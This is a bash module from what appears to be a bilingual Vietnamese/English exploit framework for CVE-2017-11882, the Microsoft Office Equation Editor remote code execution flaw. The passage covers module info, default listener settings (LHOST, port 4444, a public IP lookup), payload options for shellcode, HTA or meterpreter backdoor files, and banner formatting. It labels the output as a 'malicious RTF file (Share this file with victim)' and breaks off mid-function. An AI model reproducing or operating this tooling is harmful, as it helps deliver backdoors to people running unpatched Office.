############## info ###############
###################################
function module_info {
if [ "$language" = "VN" ]; then
cat << !

        Tên: CVE-2017-11882 | Lỗ hổng thực thi mã từ xa Microsoft Office
     Mô-đun: exploit/windows/fileformat/CVE-2017-11882_office_rce
   Nền tảng: Windows
  Kiến trúc: x86, x64
  Quyền hạn: Không
    Công bố: 11/14/2017

Cung cấp bởi:
  @unamer @embedi

Mục tiêu khả dụng:
   Id  Tên
   --  ----
   0   Tất cả các phiên bản chưa được vá lỗi của Microsoft Office được liệt kê ở dưới :
	   Microsoft Office 2007 Service Pack 3
	   Microsoft Office 2010 Service Pack 2
	   Microsoft Office 2010 Service Pack 2
	   Microsoft Office 2013 Service Pack 1
	   Microsoft Office 2013 Service Pack 1
	   Microsoft Office 2016 (32-bit edition)
	   Microsoft Office 2016 (64-bit edition)
!
module_compare
cat << !
Miêu tả:
   Microsoft Equation Editor, một thành phần của Microsoft Office chứa một lỗ hổng
   tràn bộ đệm do không xử lý đúng các đối tượng OLE trong bộ nhớ cho phép thực thi
   mã từ xa trên một hệ thống dễ bị tổn thương.

Tham khảo:
   https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882
   https://medium.com/@ahmedjouini99/cve-2017-11882-technical-analysis-ca78e24c05c2
   https://unit42.paloaltonetworks.com/unit42-analysis-of-cve-2017-11882-exploit-in-the-wild/
   https://github.com/embedi/CVE-2017-11882
   https://github.com/unamer/CVE-2017-11882

!
elif [ "$language" = "EN" ]; then
cat << !

       Name: CVE-2017-11882 | Microsoft Office Remote Code Execution Vulnerability
     Module: exploit/windows/fileformat/CVE-2017-11882_office_rce
   Platform: Windows
       Arch: x86, x64
 Privileged: No
  Disclosed: 11/14/2017

Provided by:
  @unamer @embedi

Available targets:
   Id  Name
   --  ----
   0   All unpatched versions of Microsoft Office programs are listed below:
	   Microsoft Office 2007 Service Pack 3
	   Microsoft Office 2010 Service Pack 2
	   Microsoft Office 2010 Service Pack 2
	   Microsoft Office 2013 Service Pack 1
	   Microsoft Office 2013 Service Pack 1
	   Microsoft Office 2016 (32-bit edition)
	   Microsoft Office 2016 (64-bit edition)
!
module_compare
cat << !
Description:
   Microsoft Equation Editor, which is a Microsoft Office component,
   contains a stack buffer overflow vulnerability  because it does not properly handle 
   OLE objects in memory that enables remote code execution on a vulnerable system.

References:
   https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882
   https://medium.com/@ahmedjouini99/cve-2017-11882-technical-analysis-ca78e24c05c2
   https://unit42.paloaltonetworks.com/unit42-analysis-of-cve-2017-11882-exploit-in-the-wild/
   https://github.com/embedi/CVE-2017-11882
   https://github.com/unamer/CVE-2017-11882

!
fi
############ Hàm gán giá trị các biến #####################
}
function defaul_module_options {
	lhost=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'` > /dev/null 2>&1
	lport="4444"
	file_name="CVE-2017-11882.rtf"
	type_file="RTF"
	backdoor_file=""
	payload_type="shellcode"
	inject="false"
	srvhost="0.0.0.0"
	srvport="8080"
	x="0"
	attack_type="Lan"
	publichost=`dig +short myip.opendns.com @resolver1.opendns.com`
	publicport=`echo $lport`
	file_name_lenght=18
	backdoor_file_lenght=18
	publichost_lenght=18
}
############# Hàm kiểm tra chọn lựa để in ra màng hình ###############
function module_compare {

i_characters="i"
g_characters="g"	
_characters1="-"
_characters2="-"
################## nếu biến có độ dài nhỏ hơn 18 thì vẫn lấy giá trị 18 ###############
if [[ $file_name_lenght -le 18 ]]; then
	file_name_lenght=18
fi
if [[ $publichost_lenght -le 18 ]]; then
	publichost_lenght=18
fi
if [[ $backdoor_file_lenght -le 18 ]]; then
	backdoor_file_lenght=18
fi
plus_strings=`expr $backdoor_file_lenght + $file_name_lenght + $publichost_lenght`
if  [[ "$plus_strings" -le 54 ]]; then
		module1
else
		module2
fi
}
############### Hàm nhận giá trị nhận vào của biến ###################
function set_module {
		if [[ "$new_processing_variables" = "file_name" ]] || [[ "$new_processing_variables" = "FILE_NAME" ]] || [[ "$new_processing_variables" = "File_name" ]]; then
			############# xóa biến và gán lại biến ################
			unset file_name
			file_name=$module_set
			file_name_lenght=`echo $file_name | awk '{print length}'`
			if [[ $file_name_lenght -le 18 ]]; then
				file_name_lenght=18
			fi
			################# nhận dạng đuôi file ra ###################
			type=`echo $file_name | cut -d'.' -f2` > /dev/null 2>&1
			if  [ "$type" = "rtf" ]; then
				type_file="RTF"
			elif [ "$type" = "ppsx" ]; then
				type_file="PPSX"
			elif [ "$type" = "doc" ]; then
				type_file="DOC"
			fi
		elif [[ "$new_processing_variables" = "srvhost" ]] || [[ "$new_processing_variables" = "SRVHOST" ]] || [[ "$new_processing_variables" = "Srvhost" ]]; then
			unset srvhost
			srvhost="$module_set"
		elif [[ "$new_processing_variables" = "srvport" ]] || [[ "$new_processing_variables" = "SRVPORT" ]] || [[ "$new_processing_variables" = "Srvport" ]]; then
			unset srvport
			srvport="$module_set"
		elif [[ "$new_processing_variables" = "backdoor_file" ]] || [[ "$new_processing_variables" = "BACKDOOR_FILE" ]] || [[ "$new_processing_variables" = "Backdoor_file" ]]; then
			unset backdoor_file
			backdoor_file=`echo "$module_set" | cut -d "'" -f2` > /dev/null 2>&1
			################ bỏ đi ký tự cuối ####################
			backdoor_name=${backdoor_file##*/}
			backdoor_file_lenght=`echo $backdoor_file | awk '{print length}'`
			if [[ $backdoor_file_lenght -le 18 ]]; then
				backdoor_file_lenght=18
			fi
		elif [[ "$new_processing_variables" = "publichost" ]] || [[ "$new_processing_variables" = "PUBLICHOST" ]] || [[ "$new_processing_variables" = "Publichost" ]]; then
			unset publichost
			publichost="$module_set"
			publichost_lenght=`echo $publichost | awk '{print length}'`
			if [[ $publichost_lenght -le 18 ]]; then
				publichost_lenght=18
			fi
		elif [[ "$new_processing_variables" = "publicport" ]] || [[ "$new_processing_variables" = "PUBLICPORT" ]] || [[ "$new_processing_variables" = "Publicport" ]]; then
			unset publicport
			publicport="$module_set"
		elif [[ "$new_processing_variables" = "payload_type" ]] || [[ "$new_processing_variables" = "PAYLOAD_TYPE" ]] || [[ "$new_processing_variables" = "Payload_type" ]]; then
			if [[ "$module_set" = "file" ]] || [[ "$module_set" = "FILE" ]] || [[ "$module_set" = "File" ]]; then
				unset payload_type
				payload_type="$module_set"
		elif [[ "$module_set" = "shellcode" ]] || [[ "$module_set" = "SHELLCODE" ]] || [[ "$module_set" = "Shellcode" ]]; then
				unset payload_type
				payload_type="$module_set"
		elif [[ "$module_set" = "hta" ]] || [[ "$module_set" = "HTA" ]] || [[ "$module_set" = "Hta" ]]; then
				unset payload_type
				payload_type="$module_set"
			else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
				echo -e "$red[-]$RESET" $failed_to_validate
		fi
		elif [[ "$new_processing_variables" = "attack_type" ]] || [[ "$new_processing_variables" = "ATTACK_TYPE" ]] || [[ "$new_processing_variables" = "Attack_type" ]]; then
			if [[ "$module_set" = "lan" ]] || [[ "$module_set" = "LAN" ]] || [[ "$module_set" = "Lan" ]]; then
				unset attack_type
				attack_type="$module_set"
			elif [[ "$module_set" = "wan" ]] || [[ "$module_set" = "WAN" ]] || [[ "$module_set" = "Wan" ]]; then
				unset attack_type
				attack_type="$module_set"
			else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
				echo -e "$red[-]$RESET" $failed_to_validate
			fi		
		elif [[ "$new_processing_variables" = "inject" ]] || [[ "$new_processing_variables" = "INJECT" ]] || [[ "$new_processing_variables" = "Inject" ]]; then
			if [[ "$module_set" = "true" ]] || [[ "$module_set" = "TRUE" ]] || [[ "$module_set" = "True" ]]; then
				unset inject
				inject="$module_set"
				unset x
				x="1"
			elif [[ "$module_set" = "false" ]] || [[ "$module_set" = "FALSE" ]] || [[ "$module_set" = "False" ]]; then
				unset inject
				inject="$module_set"
				unset x
				x="0"
			else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
				echo -e "$red[-]$RESET" $failed_to_validate
			fi
		fi
}
##################### Hàm canh lề cho biến ###################
############# Khi các biến có độ dài nhỏ hơn 18 ###############
function module1 {
none=" "
myvar=""
	function unset_value {
		unset none
		unset myvar
		unset integer
		none=" "
		myvar=""
	}
file_name=`echo $file_name`
file_name_lenght=`echo $file_name | awk '{print length}'`
	integer=`expr 20 - $file_name_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	file_name=$file_name$myvar
unset_value

backdoor_file=`echo $backdoor_file`
backdoor_file_lenght=`echo $backdoor_file | awk '{print length}'`
	integer=`expr 20 - $backdoor_file_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	backdoor_file=$backdoor_file$myvar
unset_value

payload_type=`echo $payload_type`
payload_type_lenght=`echo $payload_type | awk '{print length}'`
	integer=`expr 20 - $payload_type_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	payload_type=$payload_type$myvar
unset_value
inject=`echo $inject`
inject_lenght=`echo $inject | awk '{print length}'`
	integer=`expr 20 - $inject_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	inject=$inject$myvar
unset_value
srvhost=`echo $srvhost`
srvhost_lenght=`echo $srvhost | awk '{print length}'`
	integer=`expr 20 - $srvhost_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	srvhost=$srvhost$myvar
unset_value
srvport=`echo $srvport`
srvport_lenght=`echo $srvport | awk '{print length}'`
	integer=`expr 20 - $srvport_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	srvport=$srvport$myvar
unset_value

unset_value
attack_type=`echo $attack_type`
attack_type_lenght=`echo $attack_type | awk '{print length}'`
	integer=`expr 20 - $attack_type_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	attack_type=$attack_type$myvar
unset_value
publichost=`echo $publichost`
publichost_lenght=`echo $publichost | awk '{print length}'`
	integer=`expr 20 - $publichost_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	publichost=$publichost$myvar
unset_value
publicport=`echo $publicport`
publicport_lenght=`echo $publicport | awk '{print length}'`
	integer=`expr 20 - $publicport_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	publicport=$publicport$myvar
unset_value
module_banner_1
}
############# Khi các biến có độ dài lớn hơn 18 ###############
function module2 {
none=" "
myvar=""
	function unset_value {
		unset none
		unset myvar
		unset subtract_compare_value
		none=" "
		myvar=""
	}
publichost=`echo $publichost`
publichost_lenght=`echo $publichost | awk '{print length}'`
file_name=`echo $file_name`
file_name_lenght=`echo $file_name | awk '{print length}'`
backdoor_file=`echo $backdoor_file`
backdoor_file_lenght=`echo $backdoor_file | awk '{print length}'`

subtract_compare1=`expr $publichost_lenght - $backdoor_file_lenght`
subtract_compare2=`expr $file_name_lenght - $backdoor_file_lenght`
subtract_compare3=`expr $file_name_lenght - $publichost_lenght`

if [[ $subtract_compare1 -gt 0 ]]; then
	if [[ $subtract_compare3 -lt 0 ]]; then
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		publichost=$publichost$myvar
	unset_value
		subtract_compare_value=`expr $publichost_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
		subtract_compare_value=`expr $publichost_lenght - $file_name_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		file_name=$file_name$myvar
	unset_value
	
		greater_value=$publichost_lenght
	else 
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		file_name=$file_name$myvar
	unset_value
		subtract_compare_value=`expr $file_name_lenght - $publichost_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		publichost=$publichost$myvar
	unset_value
		subtract_compare_value=`expr $file_name_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
	
		greater_value=$file_name_lenght
	fi
elif [[ $subtract_compare2 -gt 0 ]]; then
	if [[ $subtract_compare3 -gt 0 ]]; then
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		file_name=$file_name$myvar
	unset_value
		subtract_compare_value=`expr $file_name_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
		subtract_compare_value=`expr $file_name_lenght - $publichost_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		publichost=$publichost$myvar
	unset_value
	
		greater_value=$file_name_lenght
	else 
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		publichost=$publichost$myvar
	unset_value
		subtract_compare_value=`expr $publichost_lenght - $file_name_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		file_name=$file_name$myvar
	unset_value
		subtract_compare_value=`expr $publichost_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
	
		greater_value=$publichost_lenght
	fi
else
	if [[ $subtract_compare2 -lt 0 ]]; then
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
		subtract_compare_value=`expr $backdoor_file_lenght - $file_name_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		file_name=$file_name$myvar
	unset_value
		subtract_compare_value=`expr $backdoor_file_lenght - $publichost_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		publichost=$publichost$myvar
	unset_value
	
		greater_value=$backdoor_file_lenght
	else 
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		file_name=$file_name$myvar
	unset_value
		subtract_compare_value=`expr $file_name_lenght - $publichost_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		publichost=$publichost$myvar
	unset_value
		subtract_compare_value=`expr $file_name_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
	
		greater_value=$file_name_lenght
	fi
fi
publicport=`echo $publicport`
publicport_lenght=`echo $publicport | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $publicport_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	publicport=$publicport$myvar
unset_value
srvhost=`echo $srvhost`
srvhost_lenght=`echo $srvhost | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $srvhost_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	srvhost=$srvhost$myvar
unset_value
srvport=`echo $srvport`
srvport_lenght=`echo $srvport | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $srvport_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	srvport=$srvport$myvar
unset_value
payload_type=`echo $payload_type`
payload_type_lenght=`echo $payload_type | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $payload_type_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	payload_type=$payload_type$myvar
unset_value
attack_type=`echo $attack_type`
attack_type_lenght=`echo $attack_type | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $attack_type_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	attack_type=$attack_type$myvar
unset_value
inject=`echo $inject`
inject_lenght=`echo $inject | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $inject_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	inject=$inject$myvar
unset_value

subtract_compare_value=`expr $greater_value - 17 + 4`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	i_characters=$i_characters$myvar
unset_value
subtract_compare_value=`expr $greater_value - 17 + 4`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	g_characters=$g_characters$myvar
unset_value
subtract_compare_value=`expr $greater_value - 16 + 5`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	_characters1=$_characters1$myvar
unset_value
subtract_compare_value=`expr $greater_value - 16 + 3`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	_characters2=$_characters2$myvar
unset_value

module_banner_2
}
############ Opstions ##############
####################################
function module_banner_1 {
type=`echo $payload_type`
if [ "$language" = "VN" ]; then
yes="  Có "
no="  Không"
	if [[ "$type" = "file" ]] || [[ "$type" = "FILE" ]] || [[ "$type" = "File" ]]; then
cat << !

Các tùy chọn của mô-đun (exploit/windows/fileformat/CVE-2017-11882_office_rce):

   Tên       	  Thiết lập hiện tại 	Yêu cầu   Miêu tả
   ----       	  ---------------- 	--------  -----------
   File_name      $file_name $no    Tên của tệp RTF độc hại (Hãy chia sẻ tệp này!).
   Payload_type   $payload_type $no    Kiểu tải trọng (shellcode/file/hta).
   Backdoor_file  $backdoor_file $yes      Đường dẫn đến tệp thực thi / shell meterpreter / payload
   Attack_type    $attack_type $no    Kiểu tấn công (Lan/Wan).
!
	elif [[ "$type" = "hta" ]] || [[ "$type" = "HTA" ]] || [[ "$type" = "hta" ]]; then
cat << !

Các tùy chọn của mô-đun (exploit/windows/fileformat/CVE-2017-11882_office_rce):

   Tên       	  Thiết lập hiện tại 	Yêu cầu   Miêu tả
   ----       	  ---------------- 	--------  -----------
   File_name      $file_name $no    Tên của tệp RTF độc hại (Hãy chia sẻ tệp này!).
   Payload_type   $payload_type $no    Kiểu tải trọng (shellcode/file/hta).
   Attack_type    $attack_type $no    Kiểu tấn công (Lan/Wan).
!
	else
cat << !

Các tùy chọn của mô-đun (exploit/windows/fileformat/CVE-2017-11882_office_rce):

   Tên       	  Thiết lập hiện tại 	Yêu cầu   Miêu tả
   ----       	  ---------------- 	--------  -----------
   File_name      $file_name $no    Tên của tệp RTF độc hại (Hãy chia sẻ tệp này!).
   Payload_type   $payload_type $no    Kiểu tải trọng (shellcode/file/hta).
   Inject	  $inject $no    "Tiêm" shellcode vào quy trình mới.
   Attack_type    $attack_type $no    Kiểu tấn công (Lan/Wan).
!
	fi
elif [ "$language" = "EN" ]; then
yes="  yes"
no="  no "
	if [[ "$type" = "file" ]] || [[ "$type" = "FILE" ]] || [[ "$type" = "File" ]]; then
cat << !

Module options (exploit/windows/fileformat/CVE-2017-11882_office_rce):

   Name           Current Setting 	Required  Description
   ----           --------------- 	--------  -----------
   File_name      $file_name $no	  Name of malicious RTF file (Share this file with victim).
   Payload_type   $payload_type $no	  Payload type (shellcode/file/hta).
   Backdoor_file  $backdoor_file $yes      Path of an executable file / meterpreter shell / payload.
   Attack_type    $attack_type $no	  Attack type (Lan/Wan).
!
	elif [[ "$type" = "hta" ]] || [[ "$type" = "HTA" ]] || [[ "$type" = "hta" ]]; then
cat << !

Module options (exploit/windows/fileformat/CVE-2017-11882_office_rce):

   Name           Current Setting 	Required  Description
   ----           --------------- 	--------  -----------
   File_name      $file_name $no	  Name of malicious RTF file (Share this file with victim).
   Payload_type   $payload_type $no	  Payload type (shellcode/file/hta).
   Attack_type    $attack_type $no	  Attack type (Lan/Wan).
!
	else
cat << !

Module options (exploit/windows/fileformat/CVE-2017-11882_office_rce):

   Name           Current Setting 	Required  Description
   ----           --------------- 	--------  -----------
   File_name      $file_name $no	  Name of malicious RTF file (Share this file with victim).
   Payload_type   $payload_type $no	  Payload type (shellcode/file/hta).
   Inject	  $inject $no	  Inject shellcode to new process
   Attack_type    $attack_type $no	  Attack type (Lan/Wan).
!
	fi
fi
payload_value=`echo $payload_type`
if [ "$language" = "VN" ]; then
	if [[ "$payload_value" = "file" ]] || [[ "$payload_value" = "FILE" ]] || [[ "$payload_value" = "File" ]] || [[ "$payload_value" = "hta" ]] || [[ "$payload_value" = "HTA" ]] || [[ "$payload_value" = "Hta" ]]; then
cat << !
   SRVHOST        $srvhost $no    Máy chủ lắng nghe. Đây phải là một địa chỉ trên máy cục bộ ( mặc định 0.0.0.0 ).
   SRVPORT        $srvport $no    Cổng lắng nge.
!
	fi
elif [ "$language" = "EN" ]; then
	if [[ "$payload_value" = "file" ]] || [[ "$payload_value" = "FILE" ]] || [[ "$payload_value" = "File" ]] || [[ "$payload_value" = "hta" ]] || [[ "$payload_value" = "HTA" ]] || [[ "$payload_value" = "Hta" ]]; then
cat << !
   SRVHOST        $srvhost $no	  The local host to listen on.This must be an address on the local machine ( default 0.0.0.0 ).
   SRVPORT        $srvport $no	  The local port to listen on.
!
	fi
fi
attack_value=`echo $attack_type`
if [ "$language" = "VN" ]; then
	if [[ "$attack_value" = "wan" ]] || [[ "$attack_value" = "WAN" ]] || [[ "$attack_value" = "Wan" ]]; then
cat << !
   PUBLICHOST     $publichost $yes      Máy chủ lắng nghe trên WAN.
   PUBLICPORT     $publicport $yes      Cổng lắng nge trên WAN,cổng này phải trùng với cổng khởi tạo trên tải trọng.

!
	else echo ""
	fi
elif [ "$language" = "EN" ]; then
	if [[ "$attack_value" = "wan" ]] || [[ "$attack_value" = "WAN" ]] || [[ "$attack_value" = "Wan" ]]; then
cat << !
   PUBLICHOST     $publichost $yes      The public host to listen on.
   PUBLICPORT     $publicport $yes      The public port to listen on,this port must match the port created on the payload.

!
	else echo ""
	fi
fi
}

function module_banner_2 {
type=`echo $payload_type`
if [ "$language" = "VN" ]; then
yes="  Có "
no="  Không "
	if [[ "$type" = "file" ]] || [[ "$type" = "FILE" ]] || [[ "$type" = "File" ]]; then
cat << !

Các tùy chọn của mô-đun (exploit/windows/fileformat/CVE-2017-11882_office_rce):

   Tên       	  Thiết lập hiện tạ${i_characters}Yêu cầu   Miêu tả
   ----       	  ---------------${_characters1}--------  -----------
   File_name      $file_name $no   Tên của tệp RTF độc hại (Hãy chia sẻ tệp này!).
   Payload_type   $payload_type $no   Kiểu tải trọng (shellcode/file/hta).
   Backdoor_file  $backdoor_file $yes      Đường dẫn đến tệp thực thi / shell meterpreter / payload
   Attack_type    $attack_type $no   Kiểu tấn công (Lan/Wan).
!
	elif [[ "$type" = "hta" ]] || [[ "$type" = "HTA" ]] || [[ "$type" = "hta" ]]; then
cat << !

Các tùy chọn của mô-đun (exploit/windows/fileformat/CVE-2017-11882_office_rce):

   Tên       	  Thiết lập hiện tạ${i_characters}Yêu cầu   Miêu tả
   ----       	  ---------------${_characters1}--------  -----------
   File_name      $file_name $no   Tên của tệp RTF độc hại (Hãy chia sẻ tệp này!).
   Payload_type   $payload_type $no   Kiểu tải trọng (shellcode/file/hta).
   Attack_type    $attack_type $no   Kiểu tấn công (Lan/Wan).
!
	else
cat << !

Các tùy chọn của mô-đun (exploit/windows/fileformat/CVE-2017-11882_office_rce):

   Tên       	  Thiết lập hiện tạ${i_characters}Yêu cầu   Miêu tả
   ----       	  ---------------${_characters1}--------  -----------
   File_name      $file_name $no   Tên của tệp RTF độc hại (Hãy chia sẻ tệp này!).
   Payload_type   $payload_type $no   Kiểu tải trọng (shellcode/file/hta).
   Inject	  $inject $no   "Tiêm" shellcode vào quy trình mới.	
   Attack_type    $attack_type $no   Kiểu tấn công (Lan/Wan).
!
	fi
elif [ "$language" = "EN" ]; then
yes="yes"
no="no "
	if [[ "$type" = "file" ]] || [[ "$type" = "FILE" ]] || [[ "$type" = "File" ]]; then
cat << !

Module options (exploit/windows/fileformat/CVE-2017-11882_office_rce):

   Name           Current Setting${g_characters}Required  Description
   ----           ---------------${_characters2}--------  -----------
   File_name      $file_name $no      Name of malicious RTF/PPSX file (Share this file with victim).
   Payload_type   $payload_type $no      Payload type (shellcode/file/hta).
   Backdoor_file  $backdoor_file $yes      Path of an executable file / meterpreter shell / payload.
   Attack_type    $attack_type $no      Attack type (Lan/Wan).
!
	elif [[ "$type" = "hta" ]] || [[ "$type" = "HTA" ]] || [[ "$type" = "hta" ]]; then
cat << !

Module options (exploit/windows/fileformat/CVE-2017-11882_office_rce):

   Name           Current Settin${g_characters}Required  Description
   ----           --------------${_characters2}--------  -----------
   File_name      $file_name$yes      Name of malicious RTF file (Share this file with victim).
   Payload_type   $payload_type$no      Payload type (shellcode/file/hta).
   Attack_type    $attack_type$no      Attack type (Lan/Wan).
!
	else
cat << !

Module options (exploit/windows/fileformat/CVE-2017-11882_office_rce):

   Name           Current Settin${g_characters}Required  Description
   ----           --------------${_characters2}--------  -----------
   File_name      $file_name$yes      Name of malicious RTF file (Share this file with victim).
   Payload_type   $payload_type$no      Payload type (shellcode/file/hta).
   Inject	  $inject$no      Inject shellcode to new process
   Attack_type    $attack_type$no      Attack type (Lan/Wan).
!
	fi
fi
payload_value=`echo $payload_type`
if [ "$language" = "VN" ]; then
	if [[ "$payload_value" = "file" ]] || [[ "$payload_value" = "FILE" ]] || [[ "$payload_value" = "File" ]] || [[ "$payload_value" = "hta" ]] || [[ "$payload_value" = "HTA" ]] || [[ "$payload_value" = "Hta" ]]; then
cat << !
   SRVHOST        $srvhost $no   Máy chủ lắng nghe. Đây phải là một địa chỉ trên máy cục bộ ( mặc định 0.0.0.0 ).
   SRVPORT        $srvport $no   Cổng lắng nge.
!
	fi
elif [ "$language" = "EN" ]; then
	if [[ "$payload_value" = "file" ]] || [[ "$payload_value" = "FILE" ]] || [[ "$payload_value" = "File" ]]; then
cat << !
   SRVHOST        $srvhost $no      The local host to listen on.This must be an address on the local machine ( default 0.0.0.0 ).
   SRVPORT        $srvport $no      The local port to listen on.
!
	elif [[ "$payload_value" = "hta" ]] || [[ "$payload_value" = "HTA" ]] || [[ "$payload_value" = "Hta" ]]; then
cat << !
   SRVHOST        $srvhost$no      The local host to listen on.This must be an address on the local machine ( default 0.0.0.0 ).
   SRVPORT        $srvport$no      The local port to listen on.
!
	fi
fi
attack_value=`echo $attack_type`
if [ "$language" = "VN" ]; then
	if [[ "$attack_value" = "wan" ]] || [[ "$attack_value" = "WAN" ]] || [[ "$attack_value" = "Wan" ]]; then
cat << !
   PUBLICHOST     $publichost $yes      Máy chủ lắng nghe trên WAN, mặc định là địa chỉ IP của router.
   PUBLICPORT     $publicport $yes      Cổng lắng nge trên WAN, cổng này phải trùng với cổng khởi tạo trên tải trọng.

!
	else echo ""
	fi
elif [ "$language" = "EN" ]; then
	if [[ "$attack_value" = "wan" ]] || [[ "$attack_value" = "WAN" ]] || [[ "$attack_value" = "Wan" ]]; then
		if [[ "$payload_value" = "shellcode" ]] || [[ "$payload_value" = "SHELLCODE" ]] || [[ "$payload_value" = "Shellcode" ]] || [[ "$payload_value" = "hta" ]] || [[ "$payload_value" = "HTA" ]] || [[ "$payload_value" = "Hta" ]]; then
cat << !
   PUBLICHOST     $publichost$yes      The public host to listen on, default is the IP public address.
   PUBLICPORT     $publicport$yes      The public port to listen on, this port must match the port created on the payload.

!
		else
cat << !
   PUBLICHOST     $publichost $yes      The public host to listen on, default is the IP public address.
   PUBLICPORT     $publicport $yes      The public port to listen on, this port must match the port created on the payload.

!
		fi
	else echo ""
	fi
fi
}
################# targets ###################
#############################################
function show_targets {
if [ "$language" = "VN" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   0   Các phiên bản chưa được vá lỗi của Microsoft Office 2007,2010,2013,2016

!
elif [ "$language" = "EN" ]; then
cat << !
Exploit target:
   Id  Name
   --  ----
   0   Unpatched versions of Microsoft Office 2007,2010,2013,2016

!
fi
}

function target {
if [ "$language" = "VN" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   0   Các phiên bản chưa được vá lỗi của Microsoft Office 2007,2010,2013,2016

!
elif [ "$language" = "EN" ]; then
cat << !
Exploit target:
   Id  Name
   --  ----
   0   Unpatched versions of Microsoft Office 2007,2010,2013,2016

!
fi
}
################# payload list ###################
#############################################
function payload_list {
path_present=`pwd`
payload_list_file="$path_present/Config/payloads"
cat $payload_data | grep -i "   generic/" > $payload_list_file
cat $payload_data | grep -i "   windows/" >> $payload_list_file
echo "" >> $payload_list_file
}
############### output #######################
###############################################
function output_massage {
	function unset_value {
			unset none
			unset myvar
			unset integer
			none=" "
			myvar=""
		}
none=" "
myvar=""
file_output="$output_folder/$file_name"
file_output_lenght=`echo $file_output | awk '{print length}'`
	integer=`expr 70 - $file_output_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	file_output=$file_output$myvar
unset_value
file_name=`echo $file_name`
file_name_lenght=`echo $file_name | awk '{print length}'`
	integer=`expr 70 - $file_name_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	file_name=$file_name$myvar
unset_value
type_file_display=`echo $type_file`
type_file_display_lenght=`echo $type_file_display | awk '{print length}'`
	integer=`expr 70 - $type_file_display_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
